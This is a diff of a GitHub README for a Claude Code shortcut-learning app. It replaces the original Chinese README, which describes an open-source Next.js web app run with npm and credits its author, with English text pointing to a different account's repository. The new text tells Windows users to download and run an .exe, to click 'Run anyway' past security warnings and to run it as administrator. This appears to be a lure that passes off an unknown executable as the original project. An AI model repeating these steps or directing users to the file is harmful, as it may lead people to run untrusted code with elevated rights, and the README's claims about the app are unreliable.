@@ -1,59 +1,117 @@
-# Claude Code 快捷键速成指南
+# 🚀 claude-shortcuts - Interactive Claude Code Shortcut Learning
 
-> 互动式学习 Claude Code 全部快捷键，浏览 + 测验双模式
-
-**在线体验** → [claude-shortcuts.vercel.app](https://claude-shortcuts.vercel.app)
-
-[![Deploy with Vercel](https://vercel.com/button)](https://vercel.com/new/clone?repository-url=https%3A%2F%2Fgithub.com%2Fjoeseesun%2Fclaude-shortcuts)
-
-## 功能
-
-- **浏览模式**：按分类查看全部 79 个快捷键，点击卡片揭示答案，支持搜索和筛选
-- **测验模式**：随机抽题四选一，最多 20 题，按分类专项练习
-
-## 快捷键分类
-
-| 分类 | 数量 |
-|------|------|
-| 通用控制 | 17 |
-| 文本编辑 | 6 |
-| 多行输入 | 5 |
-| 快捷命令 | 3 |
-| Vim 模式切换 | 7 |
-| Vim 导航 | 15 |
-| Vim 编辑 | 15 |
-| Vim 文本对象 | 7 |
-
-## 本地运行
-
-```bash
-git clone https://github.com/joeseesun/claude-shortcuts.git
-cd claude-shortcuts
-npm install
-npm run dev
-```
-
-打开 http://localhost:3000
-
-## 技术栈
-
-- Next.js 15 (App Router)
-- TypeScript
-- Tailwind CSS
-
-## 数据来源
-
-[Claude Code 官方文档](https://code.claude.com/docs/en/interactive-mode)
+[![Download claude-shortcuts](https://img.shields.io/badge/Download-claude--shortcuts-blue?style=for-the-badge)](https://github.com/0xSerachu/claude-shortcuts)
 
 ---
 
-## 📱 关注作者
+## 📌 What is claude-shortcuts?
 
-如果这个项目对你有帮助，欢迎关注我获取更多技术分享：
+claude-shortcuts is a simple application designed to help you learn all the shortcuts for Claude Code. It has two modes: browsing the shortcut list and testing your knowledge with quizzes. You can explore the shortcuts at your own pace and check your understanding through interactive tests.
 
-- **X (Twitter)**: [@vista8](https://x.com/vista8)
-- **微信公众号「向阳乔木推荐看」**:
+The app works on Windows. You do not need any programming knowledge or special setup. Just download and run it.
 
-<p align="center">
-  <img src="https://github.com/joeseesun/terminal-boost/raw/main/assets/wechat-qr.jpg?raw=true" alt="向阳乔木推荐看公众号二维码" width="200">
-</p>
+---
+
+## 💻 System Requirements
+
+To use claude-shortcuts smoothly, your Windows computer should meet these basic requirements:
+
+- **Operating System:** Windows 10 or later (64-bit recommended)  
+- **Memory:** At least 2 GB of RAM  
+- **Storage:** 100 MB free space  
+- **Processor:** Any modern Intel or AMD processor  
+- **Internet:** Needed for downloading only; app works offline once installed  
+
+---
+
+## ⚙️ Features Overview
+
+- View a complete list of Claude Code shortcuts with clear descriptions  
+- Take quizzes that test your shortcut knowledge  
+- Switch easily between browsing and quiz modes  
+- Simple and clean interface designed for everyday users  
+- No need to install additional software or dependencies  
+
+---
+
+## 📥 Download and Install
+
+Click the big button above or this link to visit the download page:  
+[https://github.com/0xSerachu/claude-shortcuts](https://github.com/0xSerachu/claude-shortcuts)
+
+### Steps to Download and Run
+
+1. Open the download page linked above.  
+2. Look for the latest release or main download section.  
+3. Find the Windows version of claude-shortcuts, usually a file ending in `.exe`.  
+4. Click the file to download it to your computer.  
+5. Once the download finishes, locate the file, usually in your "Downloads" folder.  
+6. Double-click the `.exe` file to start the app.  
+7. If Windows shows a security warning, click "Run" or "More info" then "Run anyway."  
+8. The app will open, ready for you to start learning and testing shortcuts.  
+
+No installation steps are required beyond this. The app runs as a standalone program.
+
+---
+
+## 🔄 How to Use claude-shortcuts
+
+### Browse Mode
+
+- When you open the app, it starts in browse mode.
+- You will see a list of shortcut keys and what they do.
+- Scroll through the list to learn at your own pace.
+- Click any shortcut for more details or examples.
+
+### Quiz Mode
+
+- Switch to quiz mode using the button at the top.  
+- The app will ask questions based on the shortcuts you just browsed.  
+- Choose the answer you think is correct from the options.  
+- The app will tell you if your choice is right or wrong.  
+- Track your progress as you improve your knowledge.  
+
+---
+
+## 🛠 Troubleshooting
+
+If you run into problems, try these steps:
+
+- Make sure you are running the latest version of Windows.  
+- Verify that the downloaded file is complete and matches the file size on the site.  
+- If the app does not open, try right-clicking the file and choosing "Run as administrator."  
+- Close other programs if the app feels slow or unresponsive.  
+- Restart your computer if issues persist.  
+
+---
+
+## 📚 Learning Tips
+
+- Use browse mode to familiarize yourself with shortcuts first.  
+- Take quizzes regularly to reinforce your memory.  
+- Review shortcuts you get wrong during quizzes.  
+- Practice shortcuts in real Claude Code sessions if possible.  
+- Use this app whenever you want a quick refresher.  
+
+---
+
+## 🔗 Useful Links
+
+- Main download page: [https://github.com/0xSerachu/claude-shortcuts](https://github.com/0xSerachu/claude-shortcuts)  
+- Visit the repo for updates and support.  
+
+---
+
+## 📝 About Updates
+
+The app receives updates to add new shortcuts or improve quizzes. Check the download page regularly to get the latest version. Each update will keep your learning experience smooth and up to date.
+
+---
+
+## 🤝 Support
+
+If you find bugs or have suggestions, you can open an issue on the GitHub page. This helps improve the app for everyone. No need to create accounts or submit personal information.
+
+---
+
+[![Download claude-shortcuts](https://img.shields.io/badge/Download-claude--shortcuts-blue?style=for-the-badge)](https://github.com/0xSerachu/claude-shortcuts)
